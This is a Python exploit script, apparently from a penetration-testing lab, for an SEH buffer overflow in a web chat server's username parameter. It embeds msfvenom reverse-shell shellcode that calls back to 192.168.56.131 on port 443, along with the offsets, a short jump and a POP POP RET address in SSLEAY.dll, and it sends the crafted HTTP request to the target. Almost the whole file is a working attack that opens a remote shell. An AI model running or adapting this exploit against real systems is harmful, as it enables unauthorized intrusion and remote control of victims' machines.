#!/usr/bin/env python3

import socket

ip = "192.168.56.132"
port = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# SEH is being overwritten after sending 220 bytes
# Next SEH is being overwritten after seding 216 bytes
# We can manually calculate NSEH offset by taking SEH offset - 4 bytes = Next SEH offset
# Final Exploit:
#                      ---------->
#                     |          |
# exploit = junk + nseh + seh + nop + shellcode + padding
#                     |     |
#                      <-- |
# Bad Chars = \x00\x20
# Reverse payload:
# msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.56.131 LPORT=443 -f c -b '\x00\x20'

shellcode = (
"\xd9\xc5\xd9\x74\x24\xf4\x5b\xba\x9e\x95\x0f\x37\x31\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x13\x03\xcd\x86\xed\xc2\x0d\x40\x73"
"\x2c\xed\x91\x14\xa4\x08\xa0\x14\xd2\x59\x93\xa4\x90\x0f\x18"
"\x4e\xf4\xbb\xab\x22\xd1\xcc\x1c\x88\x07\xe3\x9d\xa1\x74\x62"
"\x1e\xb8\xa8\x44\x1f\x73\xbd\x85\x58\x6e\x4c\xd7\x31\xe4\xe3"
"\xc7\x36\xb0\x3f\x6c\x04\x54\x38\x91\xdd\x57\x69\x04\x55\x0e"
"\xa9\xa7\xba\x3a\xe0\xbf\xdf\x07\xba\x34\x2b\xf3\x3d\x9c\x65"
"\xfc\x92\xe1\x49\x0f\xea\x26\x6d\xf0\x99\x5e\x8d\x8d\x99\xa5"
"\xef\x49\x2f\x3d\x57\x19\x97\x99\x69\xce\x4e\x6a\x65\xbb\x05"
"\x34\x6a\x3a\xc9\x4f\x96\xb7\xec\x9f\x1e\x83\xca\x3b\x7a\x57"
"\x72\x1a\x26\x36\x8b\x7c\x89\xe7\x29\xf7\x24\xf3\x43\x5a\x21"
"\x30\x6e\x64\xb1\x5e\xf9\x17\x83\xc1\x51\xbf\xaf\x8a\x7f\x38"
"\xcf\xa0\x38\xd6\x2e\x4b\x39\xff\xf4\x1f\x69\x97\xdd\x1f\xe2"
"\x67\xe1\xf5\xa5\x37\x4d\xa6\x05\xe7\x2d\x16\xee\xed\xa1\x49"
"\x0e\x0e\x68\xe2\xa5\xf5\xfb\xcd\x92\xcd\x78\xa5\xe0\x2d\x7e"
"\x8d\x6c\xcb\xea\xe1\x38\x44\x83\x98\x60\x1e\x32\x64\xbf\x5b"
"\x74\xee\x4c\x9c\x3b\x07\x38\x8e\xac\xe7\x77\xec\x7b\xf7\xad"
"\x98\xe0\x6a\x2a\x58\x6e\x97\xe5\x0f\x27\x69\xfc\xc5\xd5\xd0"
"\x56\xfb\x27\x84\x91\xbf\xf3\x75\x1f\x3e\x71\xc1\x3b\x50\x4f"
"\xca\x07\x04\x1f\x9d\xd1\xf2\xd9\x77\x90\xac\xb3\x24\x7a\x38"
"\x45\x07\xbd\x3e\x4a\x42\x4b\xde\xfb\x3b\x0a\xe1\x34\xac\x9a"
"\x9a\x28\x4c\x64\x71\xe9\x6c\x87\x53\x04\x05\x1e\x36\xa5\x48"
"\xa1\xed\xea\x74\x22\x07\x93\x82\x3a\x62\x96\xcf\xfc\x9f\xea"
"\x40\x69\x9f\x59\x60\xb8")

junk = '\x41' * 216 # This should reach NSEH
nseh = '\xeb\x0a\x90\x90' # JMP ten bytes
seh = '\x6d\x8a\x01\x10' # (10018A6D) POP ESI POP ECX RETN in SSLEAY.dll XP SP3
nop = '\x90' * 16
padding = '\x44' * (2000 - len(shellcode) - 224 - 16)

buf = junk + nseh + seh + nop + shellcode + padding
request = "GET /chat.ghp?username=" + buf + "&password=12345" + "&room=1&sex=1 HTTP/1.1\r\n" # Request intercepted using burpsuite
request += "Host: 127.0.0.1\r\n"
s.connect((ip,port))
request += "\r\n\r\n"
s.send(bytes(request,'latin-1'))
print("%d bytes has been sent to the target \n" % len(request))
s.close()

